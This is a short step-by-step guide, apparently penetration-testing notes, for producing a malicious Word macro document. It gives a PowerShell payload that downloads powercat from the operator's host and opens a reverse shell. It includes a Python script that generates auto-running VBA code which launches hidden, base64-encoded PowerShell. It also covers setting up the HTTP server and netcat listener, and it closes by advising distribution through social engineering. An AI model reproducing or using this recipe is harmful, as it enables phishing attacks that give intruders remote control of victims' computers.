### Process for generating malicious VBA Macro

1. Start with the following Powershell payload:
```powershell
$payload = "IEX(New-Object System.Net.WebClient).DownloadString('http://<OurIP>/powercat.ps1');powercat -c <OurIP> -p 4444 -e powershell"
```
2. Base64 Encode with Powershell (nb. you _will_ get a different result if you just `echo <payload> | base64` in Bash, use the code below):
```powershell
$b64EncodedPayload = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
$b64EncodedPayload
```
3. Feed the encoded payload as a command line arg to this Python script:
```python
import sys

print('''Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
''')
payload = f"powershell.exe -nop -w hidden -e {sys.argv[1]}"
n = 50
for i in range(0, len(payload), n):
    print(f'    Str = Str + \"{payload[i:i+n]}\"')
print('\n    CreateObject("Wscript.Shell").Run Str')
print('End Sub')
```
4. With our macro ready spin up a Windows machine that has office on it and create a Word doc with filetype `.doc`. This should be the 1997-2003 flavour. Then navigate to `View -> Macros`. Create a new macro in the file you've created and copy the macro we produced in step 3 into it.
5. If necessary exfiltrate the file via SCP:
```powershell
scp macro.doc kali@<our IP>:/home/kali
```
make sure an SSH server is running on the Kali machine:
```bash
sudo systemctl start ssh
```
6. Before distributing ensure an HTTP server is running in the same directory as a copy of `powercat.ps1`:
```bash
python3 -m http.server 80
```
and finally ensure a netcat listener is waiting for the shell:
```bash
nc -nvlp 4444
```
7. Distribute the payload via social engineering or file upload based vuln.